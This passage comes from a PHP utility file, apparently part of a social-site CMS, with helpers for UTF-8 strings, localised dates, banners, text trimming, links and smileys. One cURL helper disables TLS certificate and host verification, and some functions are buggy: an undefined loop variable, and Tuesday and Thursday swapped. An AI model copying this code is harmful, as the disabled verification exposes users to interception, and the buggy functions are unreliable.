    if (function_exists('iconv_substr')) return iconv_substr($str, $offset, $length, 'utf-8'); #(PHP 5)
    #однократные паттерны повышают производительность!
    preg_match_all('/(?>[\x09\x0A\x0D\x20-\x7E]           # ASCII
                      | [\xC2-\xDF][\x80-\xBF]            # non-overlong 2-byte
                      |  \xE0[\xA0-\xBF][\x80-\xBF]       # excluding overlongs
                      | [\xE1-\xEC\xEE\xEF][\x80-\xBF]{2} # straight 3-byte
                      |  \xED[\x80-\x9F][\x80-\xBF]       # excluding surrogates
                      |  \xF0[\x90-\xBF][\x80-\xBF]{2}    # planes 1-3
                      | [\xF1-\xF3][\x80-\xBF]{3}         # planes 4-15
                      |  \xF4[\x80-\x8F][\x80-\xBF]{2}    # plane 16
                     )
                    /xs', $str, $m);
    if ($length !== null) $a = array_slice($m[0], $offset, $length);
    else $a = array_slice($m[0], $offset);
    return implode('', $a);
}
function utf8_wordwrap($str, $len = 75, $what = "\n"){
    $from=0;
    $str_length = preg_match_all('/[\x00-\x7F\xC0-\xFD]/', $str, $var_empty);
    $while_what = $str_length / $len;
    while($i <= round($while_what)) {
        $string = preg_replace('#^(?:[\x00-\x7F]|[\xC0-\xFF][\x80-\xBF]+){0,'.$from.'}'.
                               '((?:[\x00-\x7F]|[\xC0-\xFF][\x80-\xBF]+){0,'.$len.'}).*#s',
                               '$1',$str);
        $total .= $string.$what;
        $from = $from+$len;
        $i++;
    }
    return $total;
}
function url_encoder($s)
{
    $abc = 'abcdefghijklmnopqrstuvwxyz_-1234567890?#&/\\:=+';
    $r = '';
    for ($i = 0; $i < strlen($s); $i++) {
        $letter = substr($s, $i, 1);
        if (strpos($abc, $letter) === false ) $letter = urlencode($letter);
        $r .= $letter;
    }
    return $r;
}

function time_mysql_dt2u($row)
{
	if ($row == "0000-00-00 00:00:00" or $row == "00000000000000" or $row == "")
	{
		$row = 1;
	}
	else
	{
		if (strlen($row) == 14)
		{
			$date[0] = substr($row, 0, 4);
			$date[1] = substr($row, 4, 2);
			$date[2] = substr($row, 6, 2);
			$time[0] = substr($row, 8, 2);
			$time[1] = substr($row, 10, 2);
			$time[2] = substr($row, 12, 2);
		}
		else
		{
			$d = explode(" ", $row);
			$time = explode(":", $d[1]);
			$date = explode("-", $d[0]);
		}
		$row = mktime($time[0], $time[1], $time[2], $date[1],  $date[2], $date[0]);
	}
	return $row;
}

function zodiac($date)
{
    $date = explode('-', $date);
    $month = $date[1];
    $day = $date[2];

    $zodiac = 0;

    if (( $month == 3 && $day > 20 ) || ( $month == 4 && $day < 20 )) {
        $zodiac = 1;
    } elseif (( $month == 4 && $day > 19 ) || ( $month == 5 && $day < 21 )) {
        $zodiac = 2;
    } elseif (( $month == 5 && $day > 20 ) || ( $month == 6 && $day < 21 )) {
        $zodiac = 3;
    } elseif (( $month == 6 && $day > 20 ) || ( $month == 7 && $day < 23 )) {
        $zodiac = 4;
    } elseif (( $month == 7 && $day > 22 ) || ( $month == 8 && $day < 23 )) {
        $zodiac = 5;
    } elseif (( $month == 8 && $day > 22 ) || ( $month == 9 && $day < 23 )) {
        $zodiac = 6;
    } elseif (( $month == 9 && $day > 22 ) || ( $month == 10 && $day < 23 )) {
        $zodiac = 7;
    } elseif (( $month == 10 && $day > 22 ) || ( $month == 11 && $day < 22 )) {
        $zodiac = 8;
    } elseif (( $month == 11 && $day > 21 ) || ( $month == 12 && $day < 22 )) {
        $zodiac = 9;
    } elseif (( $month == 12 && $day > 21 ) || ( $month == 1 && $day < 20 )) {
        $zodiac = 10;
    } elseif (( $month == 1 && $day > 19 ) || ( $month == 2 && $day < 19 )) {
        $zodiac = 11;
    } elseif (( $month == 2 && $day > 18 ) || ( $month == 3 && $day < 21 )) {
        $zodiac = 12;
    }

    return $zodiac;
}

#дебаг
function show_array($a)
{
	$html = "";
	$html .= "<table border=1 cellpacing=5 cellpadding=5>";
	$html .= "<tr>";
	foreach ($row as $k => $v)
	{
		if (!is_int($k))
		{
			$html .= "<tr>";
			$html .= "<td>";
			$html .= "<b>" . $k . "</b>";
			$html .= "</td>";
			$html .= "<td>";
			$html .= "" . $v . "";
			$html .= "</td>";
			$html .= "</tr>";
		}

	}
	$html .= "</table>";
	return $html;
}

function wrapTextInConntentWithMedia($content, $blockStart = '<div class="txt">', $blockEnd = '</div>')
{
    $tags = Common::grabsTags($content);
    $tagsTemp = array();
    $i = 0;
    foreach ($tags as $tag) {
        $content = str_replace($tag, "{system:{$i}}", $content);
        $tagsTemp[$i] = $tag;
        $i++;
    }
    $content = wrapTextInConntent($content, '{system:', $blockStart, $blockEnd);
    $i = 0;
    foreach ($tagsTemp as $tag) {
        $content = str_replace("{system:{$i}}", $tag, $content);
        $i++;
    }
    return $content;
}

function wrapTextInConntent($content, $str_start, $blockStart = '<div class="txt">', $blockEnd = '</div>')
{
    $result = '';
    $contentCut = $content;
    $enc = 'UTF-8';
    $lenStart = mb_strlen($str_start, $enc);
    $str_end = '}';
    $lenEnd = mb_strlen($str_end, $enc);
    $isTag = false;
    while (($start = mb_strpos($content, $str_start, 0, $enc)) !== false) {
        $content = mb_substr($content, $start + $lenStart, mb_strlen($content, $enc), $enc);
        $end = mb_strpos($content, $str_end, 0, $enc);
        if ($end !== false) {
            $tag = $str_start . mb_substr($content, 0, $end, $enc) . $str_end;
            $content = mb_substr($content, $end + $lenEnd, mb_strlen($content, $enc), $enc);
            $strCut = mb_substr($contentCut, 0, $start, $enc);
            if (str_replace(array("\r\n", "\n", "\r"), '', $strCut)){
                $strCut = "{$blockStart}$strCut{$blockEnd}";
            }
            $result .= "{$strCut}{$tag}";
            $contentCut = $content;
            $isTag = true;
        } else {
            break;
        }
    }
    if ($isTag && str_replace(array("\r\n", "\n", "\r"), '', $content)){
        $content = "{$blockStart}$content{$blockEnd}";
    }
    $result .= $content;
    return $result;
}

function grabs($content, $str_start, $str_end, $wrap = false)
{
    $i = 0;
    $r = array();
    while (($start = strpos($content, $str_start)) !== false) {
        $content = substr($content, $start + strlen($str_start));
        $end = strpos($content, $str_end);
        if ($end !== false) {
            if ($wrap) {
                $r[$i] = $str_start . substr($content, 0, $end) . $str_end;
            } else {
                $r[$i] = substr($content, 0, $end);
            }
        } else {
            break;
        }
        $i++;
    }
    return $r;
}

function grabsi($content, $str_start, $str_end, $wrap = false)
{
    $i = 0;
    $r = array();
    while (($start = stripos($content, $str_start)) !== false) {
        $content = substr($content, $start + strlen($str_start));
        $end = stripos($content, $str_end);
        if ($end !== false) {
            if ($wrap) {
				$r[$i] = $str_start . substr($content, 0, $end + strlen($str_end));
            } else {
                $r[$i] = substr($content, 0, $end);
            }
        } else {
            break;
        }
        $i++;
    }
    return $r;
}

function get_banner($place)
{
	global $g;

	$tmpl = to_sql(Common::getOption('tmpl_loaded', 'tmpl'), 'Plain');
    $lang = Common::getOption('lang_loaded', 'main');

    $sql = 'SELECT type FROM banners_places
        WHERE place = ' . to_sql($place, 'Text') . '
            AND active = 1';
    $type = DB::result($sql, 0, DB_MAX_INDEX, true);

    $where = ' place = ' . to_sql($place) . '
        AND active = 1
        AND (templates LIKE "%' . $tmpl . '%" OR templates = "")
        AND (langs LIKE "%' . $lang . '%" OR langs = "")';

    $sql = 'SELECT COUNT(*) FROM banners WHERE ' . $where;
    $count = DB::result($sql, 0, DB_MAX_INDEX, true);

    if($count == 0) {
        return false;
    }

	if($type == 'static') {
        $sql = "SELECT * FROM banners
            WHERE $where LIMIT 1";
	} elseif($type == 'random') {
        $limitStart = rand(0, $count - 1);
        $sql = "SELECT * FROM banners
            WHERE $where LIMIT $limitStart, 1";
	} else {
		return false;
	}

    DB::query($sql);
    if (DB::num_rows() == 0) {
        return false;
    }
    $banner = DB::fetch_row();
  	$banner['path'] = $g['path']['url_files'] . 'banner/';

    $banner['filename'] = str_replace(' ', '_', $banner['filename']);

	if ($banner['type'] == 'flash') {
		return "<object classid=\"clsid:D27CDB6E-AE6D-11cf-96B8-444553540000\" codebase=\"http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=7,0,19,0\" width=\"" . $banner['width'] . "\" height=\"" . $banner['height'] . "\" title=\"" . $banner['alt'] . "\">
		<param name=\"movie\" value=\"" . $banner['path'] . $banner['filename'] . "?link=" . $banner['url'] . "\" />
		<param name=\"wmode\" value=\"transparent\" />
		<embed wmode=\"transparent\" src=\"" . $banner['path'] . $banner['filename'] . "?link=" . $banner['url'] . "\" quality=\"high\" pluginspage=\"http://www.macromedia.com/go/getflashplayer\" type=\"application/x-shockwave-flash\" width=\"" . $banner['width'] . "\" height=\"" . $banner['height'] . "\"></embed>
		</object>";
	} elseif ($banner['type'] == 'code') {
        return $banner['code'];
    } else {
		return "<a href=\"" . $banner['url'] . "\"><img src=\"" . $banner['path'] . $banner['filename'] . "\" alt=\"" . $banner['alt'] . "\" /></a>";
	}
}

function pl_str_add_zeros($str, $len) {
	/*$l = strlen($str);
	$r = $str;
	while (strlen($r) < $r) {
		$r = '0' . $r;
	}*/
	$r = sprintf("%0" . $len . "d", $str);
	return $r;
}

function pl_date($format = "", $dt = '', $objDateTime = false, $timeStamp = false, $siteTime = false) {
    global $g_user;
	if (function_exists('date_default_timezone_set')) {
		date_default_timezone_set(date_default_timezone_get());
	}
    if($format==''){
        $format = 'Y-m-d H:i:s';
    }

    if($siteTime) {
        $usersTimeZone = date_default_timezone_get();
    } else {

        if(isset($g_user['timezone']) && $g_user['timezone']!='' && Common::isOptionActive('user_choose_time_zone')){
            $usersTimeZone=$g_user['timezone'];
        } elseif(Common::getOption('timezone', 'main')) {
            $usersTimeZone = Common::getOption('timezone', 'main');
        }else{
            if (function_exists('date_default_timezone_set')) {
                $usersTimeZone = date_default_timezone_get();
            } else {
                $usersTimeZone = 'UTC';
            }
        }

    }

    if ($objDateTime) {
        if ($dt == '') {
            $dt = date($format);
        }elseif ($timeStamp) {
            $dt = date($format, $dt);
        }
        $date = new DateTime($dt);
        $date->setTimezone(new DateTimeZone($usersTimeZone));
        $r = $date->format($format);
	}else if ($dt == '') {
		$r = dateTimeZone($format, time(), $usersTimeZone);
    } else if (strlen($dt) == 14) {
		#20081212020202
		$date[0] = substr($dt, 0, 4);
		$date[1] = substr($dt, 4, 2);
		$date[2] = substr($dt, 6, 2);
		$time[0] = substr($dt, 8, 2);
		$time[1] = substr($dt, 10, 2);
		$time[2] = substr($dt, 12, 2);
		if (count($time) != 3 or count($date) != 3) $dt = time();
		else $dt = mktime($time[0], $time[1], $time[2], $date[1], $date[2], $date[0]);
		$r = dateTimeZone($format, $dt, $usersTimeZone);
	} else if (strlen($dt) == 19) {
		#2008-12-12 02:02:02
		$date[0] = substr($dt, 0, 4);
		$date[1] = substr($dt, 5, 2);
		$date[2] = substr($dt, 8, 2);
		$time[0] = substr($dt, 11, 2);
		$time[1] = substr($dt, 14, 2);
		$time[2] = substr($dt, 17, 2);
		if (count($time) != 3 or count($date) != 3) $dt = time();
		else $dt = mktime($time[0], $time[1], $time[2], $date[1], $date[2], $date[0]);
		$r = dateTimeZone($format, $dt, $usersTimeZone);
	} else if (strlen($dt) == 8) {
		#20081212
		$date[0] = substr($dt, 0, 4);
		$date[1] = substr($dt, 4, 2);
		$date[2] = substr($dt, 6, 2);
		$time[0] = 0;
		$time[1] = 0;
		$time[2] = 0;
		if (count($time) != 3 or count($date) != 3) $dt = time();
		else $dt = mktime($time[0], $time[1], $time[2], $date[1], $date[2], $date[0]);
		$r = dateTimeZone($format, $dt, $usersTimeZone);
	} else if (strlen($dt) == 10 && (!is_numeric($dt))) {
		#2008-12-12
		$date[0] = substr($dt, 0, 4);
		$date[1] = substr($dt, 5, 2);
		$date[2] = substr($dt, 8, 2);
		$time[0] = 0;
		$time[1] = 0;
		$time[2] = 0;
		if (count($time) != 3 or count($date) != 3) $dt = time();
		else $dt = mktime($time[0], $time[1], $time[2], $date[1], $date[2], $date[0]);
		$r = dateTimeZone($format, $dt, $usersTimeZone);
	} else if (intval($dt) > 0) {
		#unix
		$dt = intval($dt);
		$r = dateTimeZone($format, $dt, $usersTimeZone);
	} else {
		#now
		$r = dateTimeZone($format, time(), $usersTimeZone);
	}

	$searches = array('Monday', 'Thursday' , 'Wednesday', 'Tuesday', 'Friday', 'Saturday', 'Sunday', 'January', 'February', 'March', 'April', 'May', 'June', 'July', 'August', 'September', 'October', 'November', 'December', 'Mon', 'Thu', 'Wed', 'Tue', 'Fri', 'Sat', 'Sun', 'Jan', 'Feb', 'Mar', 'Apr', 'May', 'Jun', 'Jul', 'Aug', 'Sep', 'Oct', 'Nov', 'Dec', 'at');
    foreach($searches as $k=>$v){
        $searches[$k]='/(\b)'.$v.'(\b)/iu';
    }
    static $replaces = false;
    if($replaces === false) {
        $replaces = array(pl_l('Monday'), pl_l('Thursday'), pl_l('Wednesday'), pl_l('Tuesday'), pl_l('Friday'), pl_l('Saturday'), pl_l('Sunday'), pl_l('January'), pl_l('February'), pl_l('March'), pl_l('April'), pl_l('May'), pl_l('June'), pl_l('July'), pl_l('August'), pl_l('September'), pl_l('October'), pl_l('November'), pl_l('December'), pl_l('Mon'), pl_l('Thu'), pl_l('Wed'), pl_l('Tue'), pl_l('Fri'), pl_l('Sat'), pl_l('Sun'), pl_l('Jan'), pl_l('Feb'), pl_l('Mar'), pl_l('Apr'), pl_l('May'), pl_l('Jun'), pl_l('Jul'), pl_l('Aug'), pl_l('Sep'), pl_l('Oct'), pl_l('Nov'), pl_l('Dec'), l('at'));
        foreach($replaces as $k=>$v){
            $replaces[$k]='${1}'.$v.'${2}';
        }
    }

    $r = preg_replace($searches, $replaces, $r);

	return $r;
}
function pl_date_monthes() {
	$r = array(
		'1' => 'January',
		'2' => 'February',
		'3' => 'March',
		'4' => 'April',
		'5' => 'May',
		'6' => 'June',
		'7' => 'July',
		'8' => 'August',
		'9' => 'September',
		'10' => 'October',
		'11' => 'November',
		'12' => 'December',
	);
	return $r;
}
function pl_date_weekdays() {
	$r = array(
		'1' => 'Monday',
		'2' => 'Thursday',
		'3' => 'Wednesday',
		'4' => 'Tuesday',
		'5' => 'Friday',
		'6' => 'Saturday',
		'7' => 'Sunday',
	);
	return $r;
}
function pl_l($s) {
    return l($s);
}

function dateTimeZone($format, $dt = '', $tz = '')
{
    $date = new DateTime();
    $date->setTimestamp($dt);

    if(!empty($tz)){
        $zone = new DateTimeZone($tz);
        $date->setTimezone($zone);
    }
    return $date->format($format);
}

function lReplaceSiteTitle($s, $key)
{
    global $p;

    static $keysReplaceSiteTitle = array(
        'all' => array(
            'site_needs_a_framework_to_function' => 1,
            'log_in_to' => 1,
            'facebook_invite_message' => 1,
            'invite_friends_by_sms_message' => 1,
        ),
        'index.php' => array(
            'header_visitor_text' => 1
        ),
        'email_not_confirmed.php' => array(
            'title' => 1
        ),
        'confirm_email.php' => array(
            'title' => 1
        )
    );
    if ($s && (isset($keysReplaceSiteTitle[$p][$key]) || isset($keysReplaceSiteTitle['all'][$key]))) {
        $s = Common::replaceByVars($s, array('site_title' => Common::getOption('title', 'main')));
    }
    return $s;
}

function l($s, $lang = false, $prefix = false)
{
    global $p;

    if($lang === false) {
        global $l;
        $lang = $l;
    }

    $key = to_php_alfabet($s);

    if ($prefix !== false) {
        if (isset($lang[$p][$prefix . '_' . $key])) {
            $s = $lang[$p][$prefix . '_' . $key];
        } elseif (isset($lang['all'][$prefix . '_' . $key])) {
            $s = $lang['all'][$prefix . '_' . $key];
        }
    } elseif ($p != '' and isset($lang[$p][$key])) {
        $s = $lang[$p][$key];
    } elseif (isset($lang['all'][$key])) {
        $s = $lang['all'][$key];
    } else {
        $s = '' . $s;
    }

    $s = lReplaceSiteTitle($s, $key);

    return $s;
}

function toAttrL($s, $lang = false, $prefix = false)
{
    return toAttr(l($s, $lang, $prefix));
}

function toJsL($s, $lang = false, $prefix = false)
{
    return toJs(l($s, $lang, $prefix));
}

function lCascade($s, $keys, $lang = false)
{
    global $p;

    if($lang === false) {
        global $l;
        $lang = $l;
    }

    if(is_array($keys)) {
        foreach($keys as $key) {
            $key = to_php_alfabet($key);
            if($key) {

                if ($p != '' and isset($lang[$p][$key])) {
                    $s = $lang[$p][$key];
                    break;
                } elseif (isset($lang['all'][$key])) {
                    $s = $lang['all'][$key];
                    break;
                }

            }
        }
    }

    return $s;
}

function lr($s) {
	global $l;
	global $p;
	if ($p != '' and isset($l[$p][to_php_alfabet($s)])) {
		$s = $l[$p][to_php_alfabet($s)];
	} else
	if (isset($l['all'][to_php_alfabet($s)])) {
		$s = $l['all'][to_php_alfabet($s)];
	} else {
		$s = '' . ucfirst(str_replace('_', ' ', $s));
	}
	return $s;
}

function lp($s, $page = false) {
        global $l;
        global $p;

        if($page === false) {
            $page = $p;
        }

        if (!empty($page) && isset($l[$page][to_php_alfabet($s)])) {
            $s = $l[$page][to_php_alfabet($s)];
        }
        return $s;
}

function toAttrLp($s, $page = false)
{
    return toAttr(lp($s, $page));
}

function toJsLp($s, $page = false)
{
    return toJs(lp($s, $page));
}

/*
 * @param string $fn the name of a language functions(l, toAttrL, toJsL).
 */
function lSetVarsCascade($s, $vars, $keys = null)
{
    $tmpl = Common::getOption('name', 'template_options');
    $keys = array($s . '_' . $tmpl, $tmpl . '_' . $s, $s);
    return Common::replaceByVars(lCascade($s, $keys), $vars);
}

function lSetVars($s, $vars, $fn = 'l')
{
    $value = Common::replaceByVars($fn($s), $vars);
    return $value;
}

function lVars(&$html, $s, $vars, $tmpl = '', $return = false) {
    $value = lSetVars($s, $vars);
    if($return) {
        return $value;
    }
    if($tmpl == '') {
        $tmpl = $s;
    }
    $html->setvar($tmpl, $value);
}


function strcut($str, $max_length)
{
	if(pl_strlen($str) > $max_length)
		return pl_substr($str, 0, $max_length).'...';

	return $str;
}

function pager_get_pages_links($n_pages, $page_n, $n_links = 5)
{
	$links = array();
    $tmp   = $page_n - floor($n_links / 2);
    $check = $n_pages - $n_links + 1;
    $limit = ($check > 0) ? $check : 1;
    $begin = ($tmp > 0) ? (($tmp > $limit) ? $limit : $tmp) : 1;

    $i = $begin;
    while (($i < $begin + $n_links) && ($i <= $n_pages))
    {
    	$links[] = $i++;
	}

    return $links;
}

function dateadd($givendate = '',$day = 0, $mth = 0, $yr = 0)
{
    if ($givendate == '') {
        $givendate = date('Y-m-d');
    }
    $cd = strtotime($givendate);
    $newdate = date('Y-m-d h:i:s', mktime(date('h',$cd),
    date('i',$cd), date('s',$cd), date('m',$cd)+$mth,
    date('d',$cd)+$day, date('Y',$cd)+$yr));
    return $newdate;
}

function html_meta_sanitize($str)
{
	return str_replace(array("\n", "\r"), array(' ', ' '), strip_tags($str));
}

function curpage()
{
	return (isset($_SERVER['SCRIPT_FILENAME']) ? pathinfo($_SERVER['SCRIPT_FILENAME'], PATHINFO_FILENAME) : 'index');
}
function g($section = null, $param = null)
{
    global $g;
    if ($section === null and $param === null) {
        return $g;
    } elseif ($param === null) {
        return (isset($g[$section]) ? $g[$section] : null);
    } else {
        return (isset($g[$section][$param]) ? $g[$section][$param] : null);
    }
}
function neat_trim($str, $n, $delim = '...') {
    if (pl_strlen($str) > ($n + 1)) {
        $words = explode(' ', $str);
        $i = 0;
        $r = '';
        while (pl_strlen($r . $words[$i]) < $n) {
            $r .= $words[$i] . ' ';
            $i++;
        }
        if (isset($r)) {
            if (pl_strlen($r) == pl_strlen($str)) {
                return rtrim($r);
            } else {
                return rtrim($r) . $delim;
            }
        } else {
            return $delim;
        }
    } else {
        return $str;
    }
}
function neat_trimr($str, $n, $delim = '...') {
    if (pl_strlen($str) > ($n + 1)) {
        $words = explode(' ', $str);
        $i = count($words) - 1;
        $r = '';
        while (pl_strlen($words[$i] . ' ' . $r) < $n) {
            $r = $words[$i] . ' ' . $r;
            $i--;
        }
        if (isset($r)) {
            if (pl_strlen($r) == pl_strlen($str)) {
                return rtrim($r);
            } else {
                return $delim . rtrim($r);
            }
        } else {
            return $delim;
        }
    } else {
        return $str;
    }
}
function hard_trim($str, $n, $delim = '...') {
    if (pl_strlen($str) > ($n + 1)) {
        return pl_substr($str, 0, $n) . $delim;
    } else {
        return $str;
    }
}
function hard_trimr($str, $n, $delim = '...') {
    if (pl_strlen($str) > ($n + 1)) {
        return $delim . pl_substr($str, -$n);
    } else {
        return $str;
    }
}
function strip_tags_attributes($input, $validTags = null)
{
    $regex = '#\s*<(/?\w+)\s+(?:\w+\s*=["\'].+?["\'])\s*>#is';
    return preg_replace($regex, '<${1}>', strip_tags($input, $validTags));
}


function admin_color_lines($items)
{
    $items_r = array();
    foreach ($items as $k => $v) {
        $items_r[$k] = $v;
        if ($k % 2 == 1) {
            $items_r[$k]['class'] = 'color';
            $items_r[$k]['decl'] = '_l';
            $items_r[$k]['decr'] = '_r';
        } else {
            $items_r[$k]['class'] = '';
            $items_r[$k]['decl'] = '';
            $items_r[$k]['decr'] = '';
        }
    }
    return $items_r;
}

function parse_links($text)
{
	$pattern = "#(https?|ftp)://\S+[^\s.,>)\];'\"!?]#i";
	return preg_replace($pattern,"<a href=\"$0\" target=\"_blank\">$0</a>",$text);
}

function get_headers_file(&$url)
{
    $headers = array();
    if($url) {
        if(ini_get('allow_url_fopen')) {
            $headers = get_headers($url);
        } elseif(extension_loaded('curl')) {
            $curl = curl_init();

            curl_setopt($curl, CURLOPT_URL, $url);
            curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
            curl_setopt($curl, CURLOPT_CONNECTTIMEOUT, 3600);
            curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, false);
            curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
            @curl_setopt($curl, CURLOPT_FOLLOWLOCATION, true);
            curl_setopt($curl, CURLOPT_HEADER, true);

            $result = curl_exec($curl);
            curl_close($curl);

            if($result) {
                $headers = explode("\n", $result);
            }
        } else {
            trigger_error('Please enable allow_url_fopen or curl in PHP settings');
        }
    }

    return $headers;
}

function url_file_exists(&$url)
{
    $exists = false;
    if($url) {
        $headers = get_headers_file($url);
        if(isset($headers[0])) {
            if(stristr($headers[0], '200 OK')) {
                $exists = true;
            } elseif(stristr($headers[0], '302')) {
                $len = 9;
                foreach($headers as $header) {
                    if(strtolower(substr($header, 0, $len)) == 'location:') {
                        $url = trim(substr($header, $len));
                        $exists = true;
                        break;
                    }
                }
            }
        }
    }

    return $exists;
}

function big_text_parse($name, $text, &$html, $page, $chars_per_page = 320, $nl2br = false)
{
	if(!is_numeric($page))
		$page = 0;

	if($page > 0)
	{
		$html->setvar($name."_prev_page", $page - 1);
		$html->parse($name."_prev_page", true);
	}

    $textReady = text_make_clickable_links(substr($text, $page * $chars_per_page, $chars_per_page));

    if($nl2br) {
        $textReady = nl2br($textReady);
    }

	$html->setvar($name, $textReady);
	$html->parse($name, true);

	if($page < (((strlen($text) - 1)) / $chars_per_page) - 1)
	{
		$html->setvar($name."_next_page", $page + 1);
		$html->parse($name."_next_page", true);
	}
}

function time_today($date)
{
	$dt = strtotime($date);
	if(date("Ymd") == date("Ymd", $dt))
		return date("G:i", $dt);
	return date("m.d.Y", $dt);
}

function text_make_clickable_links($text)
{
    $text = preg_replace('/(((f|ht){1}tp:\/\/)[\-a-zA-Z0-9@:%_\+.~#?&\/\/=()]+)/i',
      '<a href="\\1" target="_blank">\\1</a>', $text);
    $text = preg_replace('/([[:space:]()[{}])(www.[\-a-zA-Z0-9@:%_\+.~#?&\/\/=()]+)/i',
      '\\1<a href="http://\\2" target="_blank">\\2</a>', $text);
    $text = preg_replace('/([_\.0-9a-z\-]+@([0-9a-z][0-9a-z-]+\.)+[a-z]{2,3})/i',
      '<a href="mailto:\\1" target="_blank">\\1</a>', $text);
    return $text;
}

function chat_message_prepare($msg, $to_user = 0)
{
    global $g_user;

    $censured = false;
    $censuredUrl = '../_server/im_new/feature/censured.php';

    if (file_exists($censuredUrl)) include($censuredUrl);
    return $msg;
}

function getDefaultSmiles()
{
	$smiles = array('6'  => array(':-)', ':)', ':0)', ':o)',),
                    '28' => array('=-0', '=-o', '=-O', '8-0', '8-O', '8-o'),
                    '1'  => array(':-D', ':D', ':-d'),
                    '7'  => array(';-)', ';)', ';-D'),
                    '5'  => array(':\'-(', ':,-(', ':,('),
                    '27' => array(':-(', ':(',),
                    '12' => array(':-*', ':*'),
                    '39' => array('8-)'),
                    '23' => array(':-/', ':-[', ':-\\', ':-|'), //, ':\\', ':/'
                    '17' => array(':-P', ':-p', ':P', ':p'),
			  );
	return $smiles;
}

function getListDefaultSmiles()
{
	$smilesList = array();
	$smiles = getDefaultSmiles();
	foreach ($smiles as $id => $v) {
		foreach ($v as $k => $code) {
			$smilesList[$code] = $id;
		}
	}
	return $smilesList;
}

function replaceSmile($msg)
{
    $url = get_param('url_tmpl', Common::getOption('url_tmpl', 'path'));

	$smiles = getDefaultSmiles();
	//$msgTemp = $msg;
	foreach ($smiles as $smileNum => $smileRepls) {
        foreach ($smileRepls as $repl) {
			$msg = str_replace($repl, '<span class="smile sm' . $smileNum . '"><img src="' . $url . 'common/smilies/' . $smileNum . '.png" width="26" height="26" alt=""/></span>', $msg);
			//$msgTemp = str_replace($repl, '', $msgTemp);
		}
    }

	for ($i = 1; $i < 69; $i++) {
		$msg = str_replace('{emoji:' . $i . '}', '<span class="smile sm' . $i . '"><img src="' . $url . 'common/smilies/' . $i . '.png" width="26" height="26" alt=""/></span>', $msg);
		//$msgTemp = str_replace('{emoji:' . $i . '}', '', $msgTemp);
	}


	$msgTemp = strip_tags($msg);
	if (!$msgTemp) {
		preg_match_all('/<span class="smile sm/', $msg, $matches, PREG_PATTERN_ORDER);
		if (count($matches[0]) == 1){
			$msg = str_replace('smile sm', 'smile smile_one sm', $msg);
		}
	}

    /*$msg = str_replace('http<span class="smile sm9"><img src="' . $url . 'common/smilies/sm9.png" width="21" height="21" alt="" /></span>/', 'http://', $msg);
    $msg = str_replace('https<span class="smile sm9"><img src="' . $url . 'common/smilies/sm9.png" width="21" height="21" alt="" /></span>/', 'https://', $msg);
    $msg = str_replace('ftp<span class="smile sm9"><img src="' . $url . 'common/smilies/sm9.png" width="21" height="21" alt="" /></span>/', 'ftp://', $msg);
	*/

    #$msg = Common::parseLinks($msg, '_blank', 'txt_lower_header_color');
    return $msg;
}

function isCheckStickerText($text)
{
	return strpos($text, '{sticker:') !== false;
}

function replaceSticker($text)
{
    $url = get_param('url_tmpl', Common::getOption('url_tmpl', 'path')) . 'common/stickers/';

	if (!isCheckStickerText($text)) {
		return $text;
	}

	preg_match_all('/{sticker:([0-9]*?):(.*?)}/', $text, $matches, PREG_PATTERN_ORDER);
	foreach ($matches[0] as $key => $stick) {
		$col = $matches[1][$key];
		$img = $matches[2][$key];
		$urlStik = $url . $col . '/' . $img;
		$img = explode('.', $img);
		$text = str_replace($stick, '<span class="none_select sticker_one sticker_col_' . $col . ' sticker_img_' . $col . '_' . $img[0] . '">'.
										'<img class="nocontextmenu" src="' . $urlStik . '" width="90" height="90" alt=""/>'.
									'</span>', $text);
	}

    return $text;
}

if (!function_exists('apache_request_headers')) {

    function apache_request_headers()
    {
        $headers = null;
        foreach ($_SERVER as $key => $val) {
            if(substr($key, 0, 5) == 'HTTP_') {
                $header = substr($key, 5);
                if($header != '') {
                    $titleValues = explode('_', strtolower($header));
                    if (count($titleValues) > 0) {
                        foreach ($titleValues as $titleKey => $titleValue) {
                            $titleValues[$titleKey] = ucfirst($titleValue);
                        }
                        $header = implode('-', $titleValues);
                    }

                    $headers[$header] = $val;
                }
            }
        }
        return $headers;
    }

}

function browserLangs()
{
    $langs = array();
    if (isset($_SERVER['HTTP_ACCEPT_LANGUAGE'])) {
        foreach (explode(',', $_SERVER['HTTP_ACCEPT_LANGUAGE']) as $value) {
            if (strpos($value, ';') !== false) {
                list($value, ) = explode(';', $value);
            }
            if (strpos($value, '-') !== false) {
                list($value, ) = explode('-', $value);
            }
            $langs[] = $value;
        }
    }
    return $langs;
}

function langFindByBrowser()
{
    global $langsForBrowsers;
    $browserLangs = browserLangs();
    if (count($browserLangs)) {
        foreach ($browserLangs as $browserLang) {
            if (isset($langsForBrowsers[$browserLang]) && !Common::getOption($langsForBrowsers[$browserLang],'hide_language_'.Common::getOption('site_part', 'main')) && Common::isLanguageFileExists($langsForBrowsers[$browserLang],Common::getOption('site_part', 'main'))) {
                return $langsForBrowsers[$browserLang];
            }
        }
    }

    return false;
}

function loadAndCountLanguageWords($lang, $part) {
    global $g;
    if(file_exists(Common::getOption('dir_lang', 'path') . $part . '/' . $lang . '/language.php')){
        include (Common::getOption('dir_lang', 'path') . $part . '/' . $lang . '/language.php');
        if(isset($l)){
            return wordsCountInLanguage($l);
        }
    }
    return 0;

}

function wordsCountInLanguage($l)
{
    $counter = 0;
    foreach($l as $section => $sectionValues) {
        foreach($sectionValues as $key => $value) {
            $value = strip_tags($value);
            $value = preg_replace('/{(\S*)}/Uis', '', $value);
            $value = preg_replace('/\[(\S*)\]/Uis', '', $value);
            $value = preg_replace('/[^\p{L}\s]/', '', $value);
            $valueParts = explode(' ', $value);
            foreach($valueParts as $valuePart) {
                if(trim($valuePart) != '') {
                    $counter++;
                }
            }
        }
    }
    return $counter;
}

function newLineToParagraph($text, $tagsNoWrap = array())
{
    $tagsNoWrapCheck = (is_array($tagsNoWrap) && count($tagsNoWrap) > 0);

    $text = str_replace("\r", "\n", $text);

    $textParts = explode("\n\n", $text);

    $textNew = '';
    foreach($textParts as $textPart) {
        $textPart = trim($textPart);
        if($textPart != '') {
            $tagExists = false;
            if($tagsNoWrapCheck) {
                foreach($tagsNoWrap as $tag) {
                    if(strpos($textPart, $tag) === 0) {
                        $tagExists = true;
                        break;
                    }
                }
            }

            if(!$tagExists) {
                $textPart = '<p>' . nl2br($textPart) . '</p>';
            }

            $textNew .= $textPart;
        }
    }

    return $textNew;
}

